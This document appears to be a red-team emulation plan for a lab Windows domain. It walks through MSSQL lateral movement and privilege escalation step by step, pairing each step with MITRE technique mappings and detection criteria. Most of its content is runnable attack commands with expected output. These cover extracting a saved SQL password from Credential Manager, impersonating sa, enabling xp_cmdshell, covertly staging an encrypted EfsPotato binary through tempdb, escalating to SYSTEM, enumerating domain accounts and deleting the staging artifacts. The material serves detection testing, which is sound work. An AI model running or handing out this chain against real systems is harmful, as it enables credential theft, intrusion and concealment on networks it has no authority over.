# Phase 2 — Lateral Movement & Privilege Escalation via MSSQL

---

## Step 0 — Setup

### Procedures

- Verify TONESHELL C2 session and discovery complete — see Phase 1 Steps 1–2 completion criteria
- Stage `CertEnrollSvc.exe` to the `toneshell` handler payloads subdirectory — required by `xpstage` (Step 3):

  ```bash
  mkdir -p resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell
  cp resources/payloads/priv-escalation/EfsPotato/CertEnrollSvc.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/CertEnrollSvc.exe
  ```

- Confirm the `CredentialManager` PowerShell module is installed on `WS01` as `labuser` — see [`resources/setup/Windows Server 2022-MSSQL.md`](../resources/setup/Windows%20Server%202022-MSSQL.md) Step 6 verification block. Required for Step 1 credential extraction.
- Verify EFSSVC (`Encrypting File System`) is running on IIS01 — required for EFS named-pipe coercion in Step 3. See [`Windows Server 2022-MSSQL.md`](../resources/setup/Windows%20Server%202022-MSSQL.md) for service setup.

---

## Step 1 — Credential Access: MSSQL Password from SSMS Windows Credential Manager

### Voice Track

With IIS01 identified as a target, the adversary harvests the MSSQL password directly from Windows Credential Manager. The developer previously used SSMS on WS01 to connect to `iis01.testlab.local` as `svc_app_dev` with "Remember password" checked — SSMS 20 persists this as a `Generic` credential under a `LegacyGeneric:target=Microsoft:SSMS:20:...` entry. Because TONESHELL already runs inside `labuser`'s session, DPAPI decrypts the credential in-process with no offline cracking. The adversary first enumerates stored credentials with `cmdkey` to locate the SSMS entry, then calls `Get-StoredCredential` to extract the plaintext password.

### Procedures

1. Enumerate credentials in the current user's Credential Manager vault to identify the SSMS-saved entry:

   ```
   shell cmdkey /list
   ```

   - ***Expected Output*** (relevant excerpt)
     ```text
     Currently stored credentials:

         Target: LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1
         Type: Generic
         User: svc_app_dev
         Local machine persistence
     ```

2. ☣️ Extract the plaintext password from the SSMS credential entry:

   ```
   shell powershell -c "$cred = Get-StoredCredential -Target 'LegacyGeneric:target=Microsoft:SSMS:20:iis01.testlab.local:svc_app_dev:8c91a03d-f9b4-46c0-a305-b5dcc79ff907:1'; $cred.UserName; $cred.GetNetworkCredential().Password"
   ```

   - ***Expected Output***
     ```text
     svc_app_dev
     D3vPortal!2025
     ```

3. Record `svc_app_dev` / `D3vPortal!2025` for use in Step 2.

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| cmdkey /list enumerates Windows Credential Manager vault on WS01 | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `cmdkey.exe /list` spawned by a non-administrative parent process on WS01 — `cmdkey.exe` has no established baseline on this developer workstation | Calibrated - Not Benign | - | Red team runs `cmdkey /list` via TONESHELL shell to enumerate stored credentials and locate the SSMS-saved `svc_app_dev` entry | WS01 (10.12.10.30) | TESTLAB\labuser | — | — |
| Get-StoredCredential reads SSMS-saved MSSQL password from Windows Credential Manager | Credential Access | T1555.004 | Credentials from Password Stores: Windows Credential Manager | Windows | `powershell.exe` (non-standard parent) executes script block containing `Get-StoredCredential` targeting a `LegacyGeneric:target=Microsoft:SSMS:` vault entry on WS01 — `CredRead` API call against SSMS credential store from a non-interactive process context | Calibrated - Not Benign | - | `Get-StoredCredential` (CredentialManager module) calls `CredRead` against the `LegacyGeneric:target=Microsoft:SSMS:20:...` entry, decrypting `D3vPortal!2025` via DPAPI in-session as `labuser` | WS01 (10.12.10.30) | TESTLAB\labuser | — | — |

---

## Step 2 — Lateral Movement: MSSQL Authentication, Privilege Impersonation, and xp_cmdshell Activation

### Voice Track

Using the `svc_app_dev` credentials extracted from Windows Credential Manager in Step 1, the adversary authenticates to the MSSQL instance on IIS01 from WS01 via `sqlcmd`. The `svc_app_dev` login holds an `IMPERSONATE ON LOGIN::sa` privilege — a misconfiguration in the DevPortalDB setup — which the adversary exploits to switch SQL execution context to `sa`. From the `sa` context, they enable both `Ole Automation Procedures` (required for the sp_OA COM object write channel used in subsequent staging) and `xp_cmdshell` (which SQL Server disables by default). With `xp_cmdshell` active, each SQL query can spawn `cmd.exe` as the SQL Server service account (`NT SERVICE\MSSQL$SQLEXPRESS`) on IIS01, providing OS-level remote code execution. The adversary confirms execution with a `whoami` check, establishing the full execution and staging channel on IIS01 for subsequent phases. All of this is driven through the `xpinit` command in `toneshell_shell.py`, which routes sqlcmd tasks through the existing TONESHELL implant on WS01.

### Procedures

1. ☣️ In `toneshell_shell.py`, with WS01 session active — initialize the MSSQL execution channel:

   ```
   xpinit iis01.testlab.local:1433 svc_app_dev D3vPortal!2025
   ```

   This sends three sequential sqlcmd tasks through the TONESHELL implant on WS01:
   - Authenticates as `svc_app_dev`, impersonates `sa`, enables `Ole Automation Procedures` and `xp_cmdshell` via `sp_configure`
   - Verifies OS command execution by running `xp_cmdshell 'whoami'`

   - ***Expected Output***
     ```text
     [+] xpinit OK — context: nt service\mssql$sqlexpress
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| sqlcmd.exe on WS01 opens authenticated TCP/1433 session to MSSQL on IIS01 as svc_app_dev | Lateral Movement | T1021 | Remote Services | Windows | `sqlcmd.exe` spawned by a non-SSMS parent process on WS01 establishes outbound TCP/1433 connection to `10.12.10.20` — WS01 is a developer workstation, not a DBA or app-tier host | Calibrated - Not Benign | - | TONESHELL implant on WS01 spawns `sqlcmd.exe` to open an authenticated TCP/1433 session to IIS01 MSSQL as `svc_app_dev` | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / svc_app_dev | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| EXECUTE AS LOGIN sa MSSQL privilege impersonation on IIS01 | Privilege Escalation | T1134 | Access Token Manipulation | Windows | N/A - C3: MSSQL EXECUTE AS LOGIN context switch is internal to sqlservr.exe on IIS01 — no process, file, registry, or network artifact on the declared EDR surface | Not Calibrated - Not Benign | out-of-surface | `svc_app_dev` issues `EXECUTE AS LOGIN='sa'` to switch SQL execution context, exploiting the `IMPERSONATE` privilege grant | IIS01 (10.12.10.20) | svc_app_dev | — | — |
| xp_cmdshell enabled and invoked to spawn cmd.exe on IIS01 as NT SERVICE\MSSQL$SQLEXPRESS | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `sqlservr.exe` spawns `cmd.exe` on IIS01 — MSSQL service has no baseline for spawning OS command shells | Calibrated - Not Benign | - | `xpinit` enables `xp_cmdshell` via `sp_configure` from `sa` context, then invokes `xp_cmdshell 'whoami'` — `sqlservr.exe` spawns `cmd.exe` as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 | IIS01 (10.12.10.20) | sa / NT SERVICE\MSSQL$SQLEXPRESS | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |

---

## Step 3 — Payload Staging and Privilege Escalation: MSSQL DB-Channel Transfer and EFS Named-Pipe Impersonation

### Voice Track

With the MSSQL execution channel established, the adversary stages the privilege escalation tool to IIS01 entirely through the database — no HTTP from IIS01, no WinRM, no lateral file copy. The controlServer AES-256-CBC encrypts `CertEnrollSvc.exe` (an obfuscated EfsPotato variant) and generates a T-SQL INSERT script that chunks the ciphertext as base64 rows. The TONESHELL implant on WS01 receives the SQL file via the C2 file-push channel, then sqlcmd bulk-inserts the chunks into a staging table in `tempdb`. A PowerShell script, staged to IIS01 via the sp_OA FileSystemObject write channel and executed under `xp_cmdshell`, opens a SqlClient connection back to the local MSSQL instance, reads and concatenates the rows, decrypts the payload with the AES key embedded in the script, and writes the binary to `C:\ProgramData\`. The staging table is then dropped and the SQL file deleted, leaving no intermediary artifact.

With the binary on disk, the adversary invokes `CertEnrollSvc.exe` via a `xpshell cmd` task. The tool runs as the MSSQL service account (`NT SERVICE\MSSQL$SQLEXPRESS`), which holds `SeImpersonatePrivilege`. It creates an attacker-controlled named pipe and coerces LSASS to connect by triggering `EfsRpcEncryptFileSrv` via the MS-EFSR interface at `\\localhost\pipe\{guid}...`. When LSASS connects, the tool captures the SYSTEM impersonation token via `FSCTL_PIPE_IMPERSONATE` and `NtOpenThreadToken`, duplicates it to a primary token via `NtDuplicateToken`, and spawns `cmd.exe` as `NT AUTHORITY\SYSTEM` via `CreateProcessWithTokenW`. The spawned command (`whoami /priv`) is redirected to a staging file in `C:\ProgramData\`, which is read back through the xp_cmdshell channel to confirm full SYSTEM privilege. Stdin is redirected to NUL (`0<nul` in the bat script) to avoid the EfsPotato tool mis-detecting the xp_cmdshell pipe as a PE-delivery channel.

### Procedures

**A — Stage CertEnrollSvc.exe to IIS01 via MSSQL database channel**

1. ☣️ Stage `CertEnrollSvc.exe` to IIS01 via the DB channel (no HTTP from IIS01):

   ```
   xpstage CertEnrollSvc.exe
   ```

   This performs the following automatically:
   - controlServer AES-256-CBC encrypts `CertEnrollSvc.exe`, generates INSERT SQL file
   - SQL file transferred to `C:\Windows\Temp\` on WS01 via TONESHELL FILE_DOWNLOAD
   - WS01 runs `sqlcmd -i` to bulk-INSERT base64 chunks into `tempdb..stg` on IIS01
   - A PowerShell decrypt script runs on IIS01 via `xpshell psh`: reads `tempdb..stg`, AES decrypts, writes `CertEnrollSvc.exe` to `C:\ProgramData\`
   - SQL file deleted from WS01; `tempdb..stg` dropped

   - ***Expected Output***
     ```text
     [+] xpstage done → C:\ProgramData\CertEnrollSvc.exe
     ```

2. Verify the binary landed on IIS01:

   ```
   xpshell cmd dir C:\ProgramData\CertEnrollSvc.exe
   ```

   - ***Expected Output***
     ```text
     ...  CertEnrollSvc.exe
     ```

**B — Verify EFS service and escalate to SYSTEM**

3. Verify EFSSVC is running (prerequisite — EFS named-pipe coercion requires the EFS service):

   ```
   xpshell cmd sc query EFS
   ```

   - ***Expected Output***
     ```text
     STATE              : 4  RUNNING
     ```

   > If stopped: `xpshell cmd sc start EFS` then re-verify.

4. ☣️ Execute EfsPotato privilege escalation:

   ```
   xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\sys_out.txt 2>&1" lsarpc 0<nul
   ```

   The `xpshell cmd` handler stages a `.bat` to `C:\ProgramData\` via sp_OA FileSystemObject and runs it via `xp_cmdshell`. The bat content is:
   ```bat
   C:\ProgramData\CertEnrollSvc.exe "cmd /c whoami /priv > C:\ProgramData\sys_out.txt 2>&1" lsarpc 0<nul > C:\ProgramData\<out>.txt 2>&1
   ```
   - `lsarpc` selects the EFS RPC endpoint (`args[1]`)
   - `0<nul` redirects stdin to NUL — prevents EfsPotato from entering PE-from-stdin mode under xp_cmdshell's pipe stdin

5. Read escalation output to confirm SYSTEM privilege:

   ```
   xpshell cmd type C:\ProgramData\sys_out.txt
   ```

   - ***Expected Output***
     ```text
     PRIVILEGES INFORMATION
     ----------------------

     Privilege Name                            Description                                                        State
     ========================================= ================================================================== =======
     SeCreateTokenPrivilege                    Create a token object                                              Enabled
     SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
     SeTcbPrivilege                            Act as part of the operating system                                Enabled
     SeDebugPrivilege                          Debug programs                                                     Enabled
     SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
     ...
     ```

     > Full SYSTEM token — `SeDebugPrivilege`, `SeTcbPrivilege`, `SeCreateTokenPrivilege` all Enabled confirms `NT AUTHORITY\SYSTEM` context.

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| TONESHELL FILE_DOWNLOAD transfers INSERT SQL staging file to C:\Windows\Temp\ on WS01 | Command and Control | T1105 | Ingress Tool Transfer | Windows | `EssosUpdate.exe` (TONESHELL implant) on WS01 writes a new file to `C:\Windows\Temp\` — a signed Microsoft binary acting as a C2 implant depositing an inbound payload to the system temp directory, with no established baseline for file-write activity from this process | Not Calibrated - Not Benign | transport | TONESHELL implant receives `FILE_DOWNLOAD` (id=3) task and writes AES-encrypted base64 INSERT SQL file to `C:\Windows\Temp\` on WS01 | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| sqlcmd.exe on WS01 bulk-INSERTs base64 payload chunks into tempdb..stg on IIS01 via MSSQL channel | Lateral Movement | T1570 | Lateral Tool Transfer | Windows | `sqlcmd.exe` spawned by `EssosUpdate.exe` on WS01 executes with `-i C:\Windows\Temp\*.sql` against `10.12.10.20:1433` — a non-DBA, non-app-tier process bulk-inserting a SQL script file into IIS01 MSSQL via the database channel has no established baseline on this developer workstation | Calibrated - Not Benign | - | TONESHELL spawns `sqlcmd -i <sql_file>` on WS01 to bulk-INSERT base64-encoded AES-encrypted payload chunks into `tempdb..stg` on IIS01 — database used as covert staging channel, no file written to IIS01 disk | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / sa | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| sp_OA Scripting.FileSystemObject writes staged scripts (.ps1 decrypt, .bat launcher) to C:\ProgramData\ on IIS01 | Execution | T1559.001 | Inter-Process Communication: Component Object Model | Windows | `sqlservr.exe` creates `.ps1` and `.bat` script files in `C:\ProgramData\` on IIS01 via COM automation (`Scripting.FileSystemObject`) — MSSQL service has no baseline for writing executable scripts to the system data directory | Calibrated - Not Benign | - | WS01 sqlcmd invokes `sp_OACreate 'Scripting.FileSystemObject'` + `sp_OAMethod OpenTextFile/Write` twice — once to write the `.ps1` AES decrypt script, once to write the `.bat` EfsPotato launcher — both to `C:\ProgramData\` on IIS01 | IIS01 (10.12.10.20) | sa | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| xp_cmdshell spawns PowerShell decrypt script on IIS01 | Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | Windows | `powershell.exe -ExecutionPolicy Bypass -NoProfile -File C:\ProgramData\*.ps1` spawned as a grandchild of `sqlservr.exe` via `cmd.exe` on IIS01 — MSSQL service lineage has no baseline for spawning PowerShell to execute scripts from `C:\ProgramData\` | Not Calibrated - Not Benign | interpreter-spawn | `xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File <ps1>'` spawns `powershell.exe` as `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | — | — |
| PowerShell SqlClient reads tempdb..stg rows, AES decrypts, writes CertEnrollSvc.exe to C:\ProgramData\ | Stealth | T1140 | Deobfuscate/Decode Files or Information | Windows | `powershell.exe` (descendant of `sqlservr.exe`) writes `CertEnrollSvc.exe` to `C:\ProgramData\` on IIS01 — a service-context interpreter depositing a PE binary in a user-writable path following in-memory AES-256-CBC decryption | Calibrated - Not Benign | - | PowerShell opens a SqlClient loopback connection to `tempdb`, reads and concatenates all `stg` rows, AES-256-CBC decrypts the payload, writes `CertEnrollSvc.exe` binary to `C:\ProgramData\` | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| INSERT SQL file deleted from C:\Windows\Temp\ on WS01 and tempdb..stg dropped on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `EssosUpdate.exe` spawns `cmd.exe /c del /f` to delete the INSERT SQL file from `C:\Windows\Temp\` on WS01 — TONESHELL implant removing the staging artifact post-transfer; IIS01-side `DROP TABLE tempdb..stg` is N/A - C3 (internal MSSQL T-SQL operation, off EDR surface) | Not Calibrated - Not Benign | staging | WS01 deletes INSERT SQL file via `cmd /c del /f`; WS01 sqlcmd issues `DROP TABLE tempdb..stg` on IIS01 — staging artifacts cleared | WS01 (10.12.10.30) / IIS01 (10.12.10.20) | TESTLAB\labuser / sa | — | — |
| xp_cmdshell executes bat launcher spawning CertEnrollSvc.exe on IIS01 | Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `cmd.exe` (child of `sqlservr.exe` via xp_cmdshell) on IIS01 executes `C:\ProgramData\*.bat` which spawns `CertEnrollSvc.exe` — MSSQL service account executing a binary from `C:\ProgramData\` via batch file has no baseline on IIS01 | Not Calibrated - Not Benign | redundant@T1059.003 | `xp_cmdshell` runs `.bat` which spawns `CertEnrollSvc.exe` as a child of `cmd.exe` under `NT SERVICE\MSSQL$SQLEXPRESS` on IIS01 | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | — |
| CertEnrollSvc.exe EfsPotato named-pipe impersonation: creates attacker pipe → coerces LSASS via EfsRpcEncryptFileSrv → captures and duplicates SYSTEM token | Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | `CertEnrollSvc.exe` (running as `NT SERVICE\MSSQL$SQLEXPRESS`) creates a named pipe with GUID-format name (`\\.\pipe\{guid}`) and subsequently calls `NtOpenThreadToken` + `NtDuplicateToken` — named pipe impersonation sequence by a non-SYSTEM service binary in `C:\ProgramData\` on IIS01, detectable via file I/O pipe-creation event and native API monitoring kernel callbacks | Calibrated - Not Benign | - | `CertEnrollSvc.exe` executes the full EfsPotato chain: **(1)** creates a named pipe at `\\.\pipe\{guid}` (file I/O telemetry — pipe creation by a non-SYSTEM service process); **(2)** issues `EfsRpcEncryptFileSrv` RPC call targeting the `lsarpc` named pipe to force LSASS to connect to the attacker pipe (RPC/ETW telemetry — EFSSVC must be running); **(3)** calls `FSCTL_PIPE_IMPERSONATE` on the pipe handle, retrieves the SYSTEM impersonation token via `NtOpenThreadToken`, and duplicates it to a primary token via `NtDuplicateToken` (native API monitoring — kernel callback for token duplication sequence) | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | — |
| CertEnrollSvc.exe CreateProcessWithTokenW spawns cmd.exe as NT AUTHORITY\SYSTEM | Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `cmd.exe` spawned by `CertEnrollSvc.exe` on IIS01 runs as `NT AUTHORITY\SYSTEM` while parent executes as `NT SERVICE\MSSQL$SQLEXPRESS` — parent/child token privilege mismatch visible in process creation telemetry via `CreateProcessWithTokenW` | Calibrated - Not Benign | - | `CertEnrollSvc.exe` calls `CreateProcessWithTokenW` with the duplicated SYSTEM primary token to spawn `cmd.exe /c whoami /priv > C:\ProgramData\sys_out.txt` as `NT AUTHORITY\SYSTEM` | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | — |
| SYSTEM cmd.exe runs whoami /priv to confirm full privilege token on IIS01 | Discovery | T1033 | System Owner/User Discovery | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, child of `CertEnrollSvc.exe`) spawns `whoami.exe` with `/priv` argument on IIS01, redirecting output to `C:\ProgramData\sys_out.txt` — SYSTEM-context privilege enumeration following token theft | Not Calibrated - Not Benign | native-recon | `cmd.exe` running as `NT AUTHORITY\SYSTEM` executes `whoami /priv` and redirects output to `C:\ProgramData\sys_out.txt` — verifies that the duplicated token carries full SYSTEM privileges | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | — | — |
| xp_cmdshell reads SYSTEM whoami output from C:\ProgramData\sys_out.txt on IIS01 | Collection | T1005 | Data from Local System | Windows | `cmd.exe` (child of `sqlservr.exe` via xp_cmdshell) opens `C:\ProgramData\sys_out.txt` for read access on IIS01 — collection of the SYSTEM privilege discovery output via the MSSQL execution channel | Not Calibrated - Not Benign | redundant@T1059.003 | WS01 sqlcmd invokes `xp_cmdshell 'type C:\ProgramData\sys_out.txt'` to return SYSTEM privilege output to operator via C2 | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | — | — |
| EfsPotato bat launcher and output files deleted from C:\ProgramData\ on IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `cmd.exe` (child of `sqlservr.exe` via xp_cmdshell) deletes `.bat` and `.txt` files from `C:\ProgramData\` on IIS01 — artifact cleanup of staging scripts and privilege escalation output files via the MSSQL execution channel | Not Calibrated - Not Benign | staging | `xpshell cmd` cleanup deletes `.bat` and output `.txt` files from `C:\ProgramData\` via `xp_cmdshell del /f` | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | — | — |

---

## Step 4 — Discovery: Domain Groups and Accounts

### Voice Track

With NT AUTHORITY\SYSTEM confirmed on IIS01, the adversary shifts from privilege escalation to domain reconnaissance. Holding full control of the host but still bound by the IIS01 machine account's domain identity, the adversary maps testlab.local's group and account structure using the built-in Net utility — locating privileged groups such as Domain Admins and enumerating domain accounts that could serve as targets for lateral movement or credential attacks in later phases. To keep the whole sweep inside one SYSTEM context, the adversary stages a single discovery batch script through the established sp_OA file-write channel and executes it with a fresh EfsPotato SYSTEM process, so all four Net queries run under one SYSTEM `cmd.exe` and append their output to a single file retrieved over the xp_cmdshell channel.

### Procedures

**A — Stage and run the discovery batch as SYSTEM**

1. ☣️ Stage `disc.bat` to `C:\ProgramData\` on IIS01 via the sp_OA FileSystemObject write channel (same mechanism used in Step 3 to stage the decrypt script and the EfsPotato launcher):

   ```bat
   net group /domain                  > C:\ProgramData\disc_out.txt 2>&1
   net group "Domain Admins" /domain >> C:\ProgramData\disc_out.txt 2>&1
   net user /domain                   >> C:\ProgramData\disc_out.txt 2>&1
   net user administrator /domain     >> C:\ProgramData\disc_out.txt 2>&1
   ```

2. ☣️ Execute `disc.bat` under NT AUTHORITY\SYSTEM via EfsPotato — one named-pipe coercion spawns a single SYSTEM `cmd.exe` that runs the batch:

   ```
   xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\disc.bat" lsarpc 0<nul
   ```

3. Read the consolidated discovery output:

   ```
   xpshell cmd type C:\ProgramData\disc_out.txt
   ```

   - ***Expected Output*** (relevant excerpts)
     ```text
     The request will be processed at a domain controller for domain testlab.local.

     Aliases in domain testlab.local
     -------------------------------
     Domain Admins
     Domain Computers
     Domain Controllers
     ...
     The request will be processed at a domain controller for domain testlab.local.

     Group name     Domain Admins
     Comment        Designated administrators of the domain
     Members
     ---------------------------------------------------------------------------
     administrator
     ...
     The request will be processed at a domain controller for domain testlab.local.

     User accounts for \\testlab.local

     -------------------------------------------------------------------------------
     Administrator              Guest                      krbtgt
     labuser                    svc_app_dev                ...
     ```

   > `net group "Domain Admins" /domain` may return `System error 5 — Access is denied` because default AD ACLs restrict privileged-group membership reads to the machine account. The denied attempt is still a valid T1069.002 observable and does not break the chain.

4. ☣️ Clean up the staged batch and its output file:

   ```
   xpshell cmd del /f C:\ProgramData\disc.bat C:\ProgramData\disc_out.txt
   ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| net.exe group /domain enumerates testlab.local domain groups from IIS01 | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, descendant of `sqlservr.exe` on IIS01) spawns `net.exe` with `group /domain` argument — server-role host with MSSQL service lineage has no baseline for domain group enumeration | Not Calibrated - Not Benign | native-recon | `disc.bat` run in SYSTEM context invokes `net group /domain`; net.exe lists all groups in testlab.local via SAM-R to the domain controller | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | — | — |
| net.exe group "Domain Admins" /domain queries privileged group membership on testlab.local | Discovery | T1069.002 | Permission Groups Discovery: Domain Groups | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, descendant of `sqlservr.exe` on IIS01) spawns `net.exe` with `group "Domain Admins" /domain` argument — targeted privileged-group membership query from server-role host via MSSQL service lineage; process creation event observable even if AD ACL denies the query | Not Calibrated - Not Benign | native-recon | `disc.bat` runs `net group "Domain Admins" /domain` in SYSTEM context; net.exe requests Domain Admins membership — may be denied by default AD ACL, attempt is observable | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | — | — |
| net.exe user /domain enumerates testlab.local domain accounts from IIS01 | Discovery | T1087.002 | Account Discovery: Domain Account | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, descendant of `sqlservr.exe` on IIS01) spawns `net.exe` with `user /domain` argument — server-role host with MSSQL service lineage has no baseline for domain account enumeration | Not Calibrated - Not Benign | native-recon | `disc.bat` runs `net user /domain` in SYSTEM context; net.exe lists domain user accounts on testlab.local via SAM-R to the domain controller | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | — | — |
| net.exe user administrator /domain queries target domain account details on testlab.local | Discovery | T1087.002 | Account Discovery: Domain Account | Windows | `cmd.exe` (running as `NT AUTHORITY\SYSTEM`, descendant of `sqlservr.exe` on IIS01) spawns `net.exe` with `user administrator /domain` argument — targeted domain administrator account detail query from server-role host via MSSQL service lineage | Not Calibrated - Not Benign | native-recon | `disc.bat` runs `net user administrator /domain` in SYSTEM context; net.exe returns the full account record for the domain `administrator` account | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | — | — |

---
